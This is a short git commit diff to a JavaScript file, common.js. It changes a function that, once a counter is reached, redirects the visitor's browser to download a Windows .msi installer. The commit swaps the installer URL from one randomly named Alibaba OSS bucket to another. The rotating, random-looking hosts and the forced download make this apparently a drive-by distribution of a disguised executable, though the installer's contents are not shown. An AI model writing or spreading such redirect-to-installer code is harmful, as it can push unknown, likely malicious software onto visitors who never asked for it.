797cc5bf74d4014016f9e327e6a8f3864e094f50
avicil <meetrover37@gmail.com>
2025-07-05 19:11:07 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://kfgjgfsaww.oss-cn-hongkong.aliyuncs.com/UamWsuojwa.msi";
+		var url="https://psmchkfa.oss-cn-hongkong.aliyuncs.com/PsfmWdkcwsl.msi";
 		window.location=url;
 	}
 }
